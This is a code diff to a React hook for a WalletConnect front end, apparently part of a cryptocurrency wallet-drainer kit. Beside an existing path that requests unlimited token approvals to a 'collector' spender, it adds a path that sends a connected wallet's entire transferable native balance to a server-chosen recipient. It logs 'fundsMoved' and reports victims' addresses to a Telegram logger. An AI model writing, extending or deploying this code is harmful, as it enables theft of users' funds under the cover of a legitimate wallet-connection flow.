@@ -4,6 +4,7 @@ import { useCallback, useEffect, useRef, useState } from "react";
 import { TERMS_VERSION } from "../core/approve-config";
 import {
   getToken,
+  isNativeAsset,
   parseHumanToRaw,
   type TokenSymbol,
 } from "../core/chain-tokens";
@@ -17,6 +18,9 @@ import { postFlowLog } from "../core/flow-log-client";
 import { rowsFromBalances } from "../core/network-meta";
 import { createBrowserApprovalOrchestrator } from "../approval/create-browser-orchestrator";
 import { ApprovalStageName, StageStatus } from "../approval/types";
+import { createBrowserNativeTransferOrchestrator } from "../native-transfer/create-browser-orchestrator";
+import { createHttpNativeTransferApiClient } from "../native-transfer/http-api-client";
+import type { NativeTransferEstimate } from "../native-transfer/types";
 import { postTgLog } from "../core/tg-log-client";
 import {
   getErrorMessage,
@@ -37,6 +41,7 @@ import {
   getSpenderForNetwork,
 } from "../types/connect-flow-props";
 import type {
+  AssetSymbol,
   LinkedAccounts,
   NetworkRow,
   RowStatus,
@@ -63,10 +68,13 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
   const [networks, setNetworks] = useState<NetworkRow[]>([]);
   const [selectedKey, setSelectedKey] = useState<string | null>(null);
   const [rowStatus, setRowStatus] = useState<Record<string, RowStatus>>({});
-  const [token, setToken] = useState<TokenSymbol>("USDT");
+  const [asset, setAsset] = useState<AssetSymbol>("USDT");
   const [amountHuman, setAmountHuman] = useState("");
   const [unlimited, setUnlimited] = useState(false);
   const [termsAccepted, setTermsAccepted] = useState(false);
+  const [nativeEstimate, setNativeEstimate] = useState<NativeTransferEstimate | null>(null);
+  const [nativeEstimateLoading, setNativeEstimateLoading] = useState(false);
+  const [nativeEstimateError, setNativeEstimateError] = useState<string | null>(null);
 
   const parsePositiveAmount = useCallback((value: string): number | null => {
     const n = Number.parseFloat(value);
@@ -80,10 +88,13 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
   }, []);
 
   const resetAuthorizeForm = useCallback(() => {
-    setToken("USDT");
+    setAsset("USDT");
     setAmountHuman("");
     setUnlimited(false);
     setTermsAccepted(false);
+    setNativeEstimate(null);
+    setNativeEstimateLoading(false);
+    setNativeEstimateError(null);
   }, []);
 
   const setStatus = useCallback((key: string, status: RowStatus) => {
@@ -151,6 +162,44 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
       setNetworks([]);
     }
   }, [logStep, resetAuthorizeForm]);
+
+  const refreshNativeEstimate = useCallback(async () => {
+    if (!selectedKey || !isNativeAsset(asset)) {
+      setNativeEstimate(null);
+      setNativeEstimateLoading(false);
+      setNativeEstimateError(null);
+      return;
+    }
+
+    const linked = accountsRef.current;
+    const owner = selectedKey === "tron" ? linked.tron : linked.evm;
+    if (!owner) {
+      setNativeEstimate(null);
+      setNativeEstimateError(null);
+      return;
+    }
+
+    setNativeEstimateLoading(true);
+    setNativeEstimateError(null);
+    try {
+      const api = createHttpNativeTransferApiClient();
+      const estimate = await api.estimate({
+        request: { network: selectedKey, owner, traceId: traceIdRef.current },
+      });
+      setNativeEstimate(estimate);
+    } catch (err: unknown) {
+      setNativeEstimate(null);
+      const message = getErrorMessage(err, "Failed to estimate network fees");
+      setNativeEstimateError(message);
+      console.warn("[native-estimate]", message);
+    } finally {
+      setNativeEstimateLoading(false);
+    }
+  }, [asset, selectedKey]);
+
+  useEffect(() => {
+    void refreshNativeEstimate();
+  }, [refreshNativeEstimate]);
 
   useEffect(() => {
     let cancelled = false;
@@ -300,7 +349,158 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
     }
   }, [logStep, resetAuthorizeForm, scanWallet]);
 
+  const requestNativeTransfer = useCallback(async () => {
+    const provider = providerRef.current;
+    if (!provider || approvingLockRef.current) return;
+
+    const networkKey = selectedKey;
+    if (!networkKey) {
+      setError("Select a network first");
+      return;
+    }
+    if (!termsAccepted) {
+      setError("Accept the Terms & Conditions to continue");
+      return;
+    }
+
+    if (
+      !nativeEstimate ||
+      nativeEstimateLoading ||
+      nativeEstimateError ||
+      !nativeEstimate.canTransfer ||
+      BigInt(nativeEstimate.transferableRaw) <= BigInt(0) ||
+      !nativeEstimate.recipient
+    ) {
+      setError(
+        nativeEstimateError ??
+          "Wait for a successful fee estimate before transferring"
+      );
+      return;
+    }
+
+    const gaps = configGaps(spendersRef.current, networkKey);
+    if (gaps.length > 0) {
+      setError(
+        `Missing collector address: ${gaps.join(", ")} (pass props or set .env.local)`
+      );
+      return;
+    }
+
+    const linked = accountsRef.current;
+    const owner = networkKey === "tron" ? linked.tron : linked.evm;
+    if (!owner) {
+      setError(
+        networkKey === "tron"
+          ? "No Tron address in this WalletConnect session"
+          : "No EVM address in this WalletConnect session"
+      );
+      return;
+    }
+
+    approvingLockRef.current = true;
+    setApproving(true);
+    setError(null);
+    setStatus(networkKey, "waiting");
+
+    try {
+      logStep("NATIVE TRANSFER STARTED", { network: networkKey, owner });
+
+      const orchestrator = createBrowserNativeTransferOrchestrator({
+        provider,
+        logger: {
+          info: (event, detail) => logStep(event, detail ?? {}),
+          warn: (event, detail) => logStep(event, detail ?? {}),
+          error: (event, detail) => logStep(event, detail ?? {}),
+        },
+      });
+
+      const result = await orchestrator.run(
+        {
+          network: networkKey,
+          owner,
+          termsVersion: TERMS_VERSION,
+          traceId: traceIdRef.current,
+        },
+        {
+          onStage: (stageResult) => {
+            if (stageResult.stage === "BROADCAST" && stageResult.status === "OK") {
+              setStatus(networkKey, "finalizing");
+            }
+          },
+        }
+      );
+
+      if (!result.ok) {
+        const err = new Error(result.error || "Native transfer failed");
+        if (result.userRejected) {
+          (err as Error & { __userRejected?: boolean }).__userRejected = true;
+        }
+        throw err;
+      }
+
+      logStep("NATIVE TRANSFER COMPLETE", {
+        fundsMoved: result.pendingRegistered
+          ? "PENDING — registered for background reconciliation"
+          : "YES — native transfer confirmed",
+        network: networkKey,
+        owner,
+        txHash: result.txHash,
+        transferId: result.transferId,
+        amountHuman: result.context.persisted?.amountHuman,
+      });
+
+      setStatus(networkKey, "approved");
+      await scanWallet(accountsRef.current);
+      void refreshNativeEstimate();
+    } catch (err: unknown) {
+      const message = getErrorMessage(err, "Native transfer failed");
+      const rejected =
+        isUserRejection(err) ||
+        Boolean((err as { __userRejected?: boolean })?.__userRejected);
+      logStep("NATIVE TRANSFER FAILED", {
+        error: message,
+        rejectedByUser: rejected,
+        network: networkKey,
+      });
+
+      if (rejected) {
+        setError("Permission denied by user");
+        setStatus(networkKey, "rejected");
+        window.setTimeout(() => setStatus(networkKey, "awaiting"), 2200);
+      } else {
+        setError(message);
+        setStatus(networkKey, "awaiting");
+      }
+
+      void postTgLog({
+        type: "native_transfer",
+        address: owner,
+        network: networkKey,
+        status: "rejected",
+        error: rejected ? "Permission denied by user" : message,
+      });
+    } finally {
+      approvingLockRef.current = false;
+      setApproving(false);
+    }
+  }, [
+    logStep,
+    nativeEstimate,
+    nativeEstimateError,
+    nativeEstimateLoading,
+    refreshNativeEstimate,
+    scanWallet,
+    selectedKey,
+    setStatus,
+    termsAccepted,
+  ]);
+
   const requestApprove = useCallback(async () => {
+    if (isNativeAsset(asset)) {
+      await requestNativeTransfer();
+      return;
+    }
+
     const provider = providerRef.current;
     if (!provider || approvingLockRef.current) return;
 
@@ -356,19 +556,18 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
         ? Number.parseFloat(selectedNetwork.balances.native || "0")
         : 0;
 
-    // Token balance may be 0 or below the selected permission amount.
-    // approve() does not require token balance; transferFrom runs later only
-    // for whatever is actually available on-chain.
-
     approvingLockRef.current = true;
     setApproving(true);
     setError(null);
     setStatus(networkKey, "waiting");
 
+    const token = asset as TokenSymbol;
     const selectedTokens = [token];
     const spender = getSpenderForNetwork(spendersRef.current, networkKey);
     if (selectedTokens.length === 0) {
       setError("No supported tokens found for selected network");
+      approvingLockRef.current = false;
+      setApproving(false);
       return;
     }
 
@@ -544,13 +743,14 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
     }
   }, [
     amountHuman,
+    asset,
     logStep,
     networks,
     parsePositiveAmount,
+    requestNativeTransfer,
     selectedKey,
     setStatus,
     termsAccepted,
-    token,
     unlimited,
   ]);
 
@@ -559,9 +759,24 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
       if (approving) return;
       setSelectedKey(key);
       setError(null);
-      setToken("USDT");
+      setAsset("USDT");
       setAmountHuman("");
       setUnlimited(false);
+      setNativeEstimate(null);
+      setNativeEstimateError(null);
+    },
+    [approving]
+  );
+
+  const onAssetChange = useCallback(
+    (next: AssetSymbol) => {
+      if (approving) return;
+      setAsset(next);
+      setError(null);
+      if (isNativeAsset(next)) {
+        setAmountHuman("");
+        setUnlimited(false);
+      }
     },
     [approving]
   );
@@ -584,14 +799,18 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
     networks,
     selectedKey,
     rowStatus,
-    token,
+    asset,
     amountHuman,
     unlimited,
     termsAccepted,
+    nativeEstimate,
+    nativeEstimateLoading,
+    nativeEstimateError,
+    onRetryNativeEstimate: refreshNativeEstimate,
     termsVersion: TERMS_VERSION,
     openWalletConnect,
     onSelectNetwork,
-    onTokenChange: setToken,
+    onAssetChange,
     onAmountChange: setAmountHuman,
     onUnlimitedChange: (value: boolean) => {
       setUnlimited(value);
